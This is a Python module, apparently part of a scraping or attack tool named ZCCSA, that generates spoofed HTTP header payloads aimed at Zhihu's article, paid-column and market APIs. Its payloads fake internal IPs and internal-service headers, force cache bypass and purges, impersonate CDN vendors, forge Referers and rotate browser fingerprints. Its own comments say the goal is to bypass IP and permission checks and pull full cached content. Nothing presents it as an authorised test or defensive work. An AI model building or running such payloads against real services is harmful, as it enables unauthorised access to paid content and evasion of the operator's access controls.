# -*- coding: utf-8 -*-
"""
ZCCSA 请求头变异Fuzzer
- 维护多种请求头变异模板
- 随机轮换UA、IP、屏幕分辨率等指纹特征
- 生成符合真实浏览器特征的请求头序列
"""
import itertools
import random
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))
import config


@dataclass
class FuzzPayload:
    """单个Fuzzing载荷"""
    name: str                      # 载荷名称（描述）
    headers: Dict[str, str]        # 要注入/替换的请求头
    category: str                  # 分类：internal_ip / service / cache / vendor / random
    expected_behavior: str = ""    # 期望行为描述（用于报告）


class HeaderFuzzer:
    """
    请求头变异Fuzzer：生成系统化的请求头变异组合，
    用于CDN缓存探测、API边界测试等场景。
    """

    # 内网IP地址池
    _INTERNAL_IPS = [
        "10.0.0.1", "10.0.0.2", "10.10.0.1", "10.100.0.1",
        "172.16.0.1", "172.17.0.1", "172.20.0.1", "172.31.0.1",
        "192.168.0.1", "192.168.1.1", "192.168.100.1",
        "127.0.0.1", "[::1]", "0.0.0.0",
    ]

    # CDN节点IP头字段
    _CDN_IP_HEADERS = [
        "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
        "X-Remote-Addr", "X-Client-IP", "X-Cluster-Client-IP",
        "CF-Connecting-IP", "X-True-Client-IP",
    ]

    # 服务间调用头
    _SERVICE_HEADERS = {
        "X-Zhihu-Service": ["article-api", "paid-api", "column-api",
                            "market-api", "content-api", "remix-api"],
        "X-Internal-Request": ["true", "1", "yes"],
        "X-Request-From": ["internal", "service", "backend", "cron"],
        "X-Forwarded-Host": ["article-api.zhihu.com", "api.zhihu.com",
                             "market-api.zhihu.com"],
        "X-Source-Service": ["article", "paid_column", "market"],
    }

    # 缓存控制头
    _CACHE_HEADERS = [
        {"Cache-Control": "no-cache", "Pragma": "no-cache"},
        {"Cache-Control": "max-age=0"},
        {"Cache-Control": "no-store", "Pragma": "no-cache"},
        {"Cache-Control": "must-revalidate"},
        {"X-Cache-Bypass": "1"},
        {"X-Cache-Purge": "1"},
        {"Cache-Purge": "1"},
        {"X-Bypass-Cache": "true"},
    ]

    # CDN厂商特定头
    _VENDOR_HEADERS = [
        # 阿里云CDN
        {"X-Vendor": "aliyun", "Ali-Swift-Global-Savetime": "0"},
        # Cloudflare
        {"CF-Cache-Status": "HIT", "CF-Ray": "test-cf-ray"},
        # 腾讯云
        {"X-Cache": "HIT", "X-Cache-Lookup": "HIT"},
        # 网宿
        {"Via": "cache25.l2cn1822[0,0,200-0,H]"},
        # 通用缓存命中标记
        {"Age": "3600"},
        {"X-Cached": "true"},
    ]

    # 来源伪造
    _REFERER_SPOOF = [
        "https://www.zhihu.com/",
        "https://zhuanlan.zhihu.com/",
        "https://www.zhihu.com/market",
        "https://weread.qq.com/",
        "https://mp.weixin.qq.com/",
    ]

    def __init__(self, seed: Optional[int] = None):
        if seed is not None:
            random.seed(seed)
        self._payloads: List[FuzzPayload] = []
        self._build_default_payloads()

    def _build_default_payloads(self) -> None:
        """构建默认Fuzzing载荷集"""
        payloads = []

        # 1. 内网IP伪装
        for header in self._CDN_IP_HEADERS[:4]:  # 限制数量避免爆炸
            for ip in self._INTERNAL_IPS[:6]:
                payloads.append(FuzzPayload(
                    name=f"内网IP-{header}-{ip}",
                    headers={header: ip},
                    category="internal_ip",
                    expected_behavior="可能绕过基于IP的访问控制，命中CDN缓存"
                ))

        # 2. 服务间调用头
        for h_name, values in self._SERVICE_HEADERS.items():
            for v in values[:3]:
                payloads.append(FuzzPayload(
                    name=f"服务调用-{h_name}={v}",
                    headers={h_name: v},
                    category="service",
                    expected_behavior="可能被识别为内部服务请求，绕过权限校验"
                ))

        # 3. 缓存控制头
        for h_set in self._CACHE_HEADERS:
            name = "+".join(h_set.keys())
            payloads.append(FuzzPayload(
                name=f"缓存控制-{name}",
                headers=h_set,
                category="cache",
                expected_behavior="强制刷新缓存，可能命中未失效的完整内容"
            ))

        # 4. CDN厂商头
        for h_set in self._VENDOR_HEADERS:
            name = "+".join(h_set.keys())
            payloads.append(FuzzPayload(
                name=f"CDN头-{name}",
                headers=h_set,
                category="vendor",
                expected_behavior="伪装CDN节点间通信，获取缓存内容"
            ))

        # 5. Referer伪造
        for ref in self._REFERER_SPOOF:
            payloads.append(FuzzPayload(
                name=f"来源伪造-{ref[:30]}",
                headers={"Referer": ref},
                category="referer",
                expected_behavior="绕过Referer检查"
            ))

        # 6. 组合载荷（高价值组合）
        combos = [
            # 内网IP + 服务调用
            {"X-Forwarded-For": "127.0.0.1", "X-Internal-Request": "true"},
            {"X-Real-IP": "10.0.0.1", "X-Zhihu-Service": "article-api"},
            # 内网IP + 缓存绕过
            {"X-Forwarded-For": "192.168.1.1", "X-Cache-Bypass": "1"},
            # 全服务头组合
            {"X-Internal-Request": "true", "X-Zhihu-Service": "article-api",
             "X-Request-From": "internal", "X-Forwarded-For": "10.0.0.1"},
        ]
        for combo in combos:
            payloads.append(FuzzPayload(
                name=f"组合-{'+'.join(combo.keys())[:40]}",
                headers=combo,
                category="combo",
                expected_behavior="组合攻击向量，测试多层防护的绕过可能性"
            ))

        self._payloads = payloads

    @property
    def payloads(self) -> List[FuzzPayload]:
        """获取所有Fuzzing载荷"""
        return list(self._payloads)

    def get_payloads_by_category(self, category: str) -> List[FuzzPayload]:
        """按分类获取载荷"""
        return [p for p in self._payloads if p.category == category]

    def generate_random_headers(self, base_headers: Optional[Dict] = None) -> Dict[str, str]:
        """
        生成一组随机变异的请求头（用于模糊测试/随机性探测）
        :param base_headers: 基础请求头
        """
        headers = dict(base_headers or config.DEFAULT_HEADERS_DESKTOP)

        # 随机选择是否修改UA
        if random.random() < 0.3:
            fp = config.DEFAULT_HEADERS_MOBILE if random.random() < 0.3 \
                else config.DEFAULT_HEADERS_DESKTOP
            headers.update(fp)

        # 随机注入1-3个Fuzzing头
        if self._payloads:
            n = random.randint(1, 3)
            chosen = random.sample(self._payloads, min(n, len(self._payloads)))
            for p in chosen:
                headers.update(p.headers)

        return headers

    def generate_fingerprint_variants(self, n: int = 5) -> List[Dict[str, str]]:
        """
        生成n组不同的浏览器指纹（UA、分辨率、语言等）
        """
        from core.session_manager import SessionManager
        variants = []
        for i in range(n):
            sm = SessionManager(use_mobile=random.random() < 0.25)
            variants.append({
                "User-Agent": sm.fingerprint.user_agent,
                "Accept-Language": sm.fingerprint.accept_language,
                "X-Screen-Resolution": sm.fingerprint.screen_resolution,
                "_session_id": sm.fingerprint.session_id,
            })
            sm.close()
        return variants

    def get_baseline_headers(self) -> Dict[str, str]:
        """获取基线请求头（无任何变异，作为对照）"""
        return dict(config.DEFAULT_HEADERS_DESKTOP)

    def get_payload_count(self) -> Dict[str, int]:
        """统计各类别载荷数量"""
        counts = {}
        for p in self._payloads:
            counts[p.category] = counts.get(p.category, 0) + 1
        return counts

    def add_custom_payload(self, payload: FuzzPayload) -> None:
        """添加自定义Fuzzing载荷"""
        self._payloads.append(payload)

    def __len__(self) -> int:
        return len(self._payloads)

    def __iter__(self):
        return iter(self._payloads)
